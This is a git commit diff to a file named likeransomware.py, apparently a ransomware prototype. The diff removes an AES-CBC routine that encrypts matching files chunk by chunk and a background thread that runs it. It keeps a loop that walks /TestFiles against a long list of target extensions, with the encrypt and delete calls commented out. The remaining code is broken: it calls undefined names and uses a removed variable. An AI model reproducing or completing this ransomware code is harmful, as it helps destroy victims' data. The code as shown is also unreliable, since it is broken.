3eacaec01114e19f9836bb72250f7373fb8601ac
ohadvano <ohadvano@gmail.com>
2020-12-13 14:23:28 +0200

    .

--- likeransomware.py
+++ likeransomware.py
@@ -7,60 +7,31 @@ import threading
 import os
 import sys
 
-encryption_timeout = 10
-encrypted_symbol = "enc_"
-
-# this function encrypts a single file
-def encrypt_file(key, filename, filepath):
-    dirpath = os.path.dirname(filepath)
-    filesize = str(os.path.getsize(filepath)).zfill(16)
-    iv = Random.new().read(16)  # Contains the initial value which will be used to start a cipher feedback mode
-    print(iv)
-    aes_obj = AES.new(key, AES.MODE_CBC, iv)
-    return
-    with open(filepath, 'rb') as infile:  # opens the file
-        with open(os.path.join(dirpath, encrypted_symbol + filename), 'wb') as outfile:  # set the output file with a different name
-            outfile.write(filesize.encode('utf-8'))
-            outfile.write(iv)
-
-            while True:  # write the file with chunk of 64 * 1024 and encrypt it
-                chunk = infile.read(64 * 1024)
-                if len(chunk) == 0:  # if true then done reading
-                    break
-                elif len(chunk) % 16 != 0:
-                    chunk += b' ' * (16 - (len(chunk) % 16))  # fill the chunk to 16 if not length of 16
-
-                outfile.write(aes_obj.encrypt(chunk))  # the encryption occures here
-
-# this is the run function of the daemon thread, it iterates all the files in system and encryptes specific ones
 def encrypt_all_files():
-    # encrypt all files with following types
-    password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))  # generate random password
+    password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32)) 
     ext = ('.jpg', '.png', '.bmp', '.raw', '.c', '.java', '.class', '.cpp', '.h', '.jar', '.txt', '.doc', '.docx', '.pdf', '.ptx', '.ppt', '.rar', '.zip', '.7z', '.mp3', '.mp4', '.mpg', '.mpeg', '.avi', '.tar.gz', '.sql', '.xml', '.py', '.js', '.php', '.pps', '.cs', '.xls', '.xlsx', '.3gp', '.mov', '.mkv', '.vob', '.wps', '.odt')
     for root, dirs, files in os.walk("/TestFiles", topdown=True):  # iterate from home
         for filename in files:
-            if filename.endswith(ext) and not filename.startswith(encrypted_symbol):  # pick only certain files and not enc ones
+            if filename.endswith(ext) and not filename.startswith(encrypted_symbol):  
                 try:
-                    key = SHA256.new(password.encode('utf-8')).digest()  # generates a 256bit key from password
+                    key = SHA256.new(password.encode('utf-8')).digest()  
                     filepath = os.path.abspath(os.path.join(root, filename))
                     print("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
                     # encrypt_file(key, filename, filepath)  # calls the encrypt function
                     # os.remove(filepath)  # deletes the file
                     break
-                    print("bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb")
                 except:
                     pass
         break
 
+def GetAllFiles():
+    f = []
+    for (dirpath, dirnames, filenames) in walk(mypath):
+        f.extend(filenames)
+        break
+    return f
+
 ###################### main ######################
 
-t1 = threading.Thread(target=encrypt_all_files)  # daemon thread runs the encrypt_all_files() function in background
-t1.daemon = True  # make the thread run in bg
-t1.start()  # start the encrypting thread
-t1.join(encryption_timeout)
-
-# If thread is still active
-if t1.is_alive():
-    print("terminated")
-    t1.terminate()
-    t1.join()
+files_list = GetAllFiles()
+print(files_list)
